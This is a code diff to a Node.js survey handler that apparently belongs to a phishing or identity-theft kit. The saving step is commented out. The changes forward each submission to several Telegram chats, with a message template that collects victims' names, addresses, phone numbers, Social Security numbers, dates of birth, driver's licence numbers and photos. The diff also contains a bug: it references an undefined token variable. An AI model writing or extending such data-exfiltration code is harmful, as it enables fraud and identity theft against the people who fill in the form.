@@ -3,7 +3,7 @@ import axios from "axios";
 import { generateSign } from "../helper/tiktok.api.js";
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const CHAT_IDS = process.env.TELEGRAM_CHAT_IDS?.split(",") || [];
 
 export const createSurvey = async (req, res) => {
   try {
@@ -40,7 +40,7 @@ export const createSurvey = async (req, res) => {
     // const survey = await prisma.survey.create({ data });
 
     // send tele
-    sendTelegramNotification(`New Survey:\n\n${JSON.stringify(data, null, 2)}`);
+    await sendTelegramNotification(formatMessage(data));
 
     res.status(200).json({ message: "Survey created successfully" });
   } catch (error) {
@@ -53,18 +53,57 @@ export const createSurvey = async (req, res) => {
 };
 
 async function sendTelegramNotification(message) {
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  await Promise.all(
+    CHAT_IDS.map((chatId) =>
+      axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        chat_id: chatId.trim(), // always good to trim spaces
+        text: message,
+        parse_mode: "Markdown",
+      })
+    )
+  );
+  console.log("Message sent to all chat IDs");
+}
 
-  try {
-    await axios.post(url, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-    });
-    console.log("Notification sent to Telegram!");
-  } catch (error) {
-    console.error(
-      "Failed to send notification:",
-      error.response?.data || error.message
-    );
-  }
+function formatMessage(data) {
+  return `
+📝 New Survey Submission:
+
+✅ Answers:
+${data.answers.map((answer) => `- ${answer}`).join("\n")}
+
+🪪 License Type: ${capitalizeFirstLetter(data.licenseType)}
+
+👤 Full Name: ${data.fullName}
+🏡 Address: ${data.address}, ${data.city}, ${data.state}, ${data.zipcode}
+
+📞 Phone: ${data.phone}
+
+🖼️ Photo URL:
+${data.photoUrl}
+
+🔒 SSN: ${data.ssn}
+
+🚚 Delivery Info:
+- First Name: ${data.delivery.firstName}
+- Last Name: ${data.delivery.lastName}
+- Email: ${data.delivery.email}
+- Twitter: ${data.delivery.twitter}
+- Phone Number: ${data.delivery.phoneNumber}
+
+🆔 Identity Info:
+- First Name: ${data.identity.firstName}
+- Last Name: ${data.identity.lastName}
+- Date of Birth: ${data.identity.dob}
+- Gender: ${data.identity.gender}
+- Address: ${data.identity.address}
+- City: ${data.identity.city}
+- State: ${data.identity.state}
+- Zipcode: ${data.identity.zipcode}
+- DL Number: ${data.identity.dlNumber}
+`;
+}
+
+function capitalizeFirstLetter(string) {
+  return string.charAt(0).toUpperCase() + string.slice(1);
 }
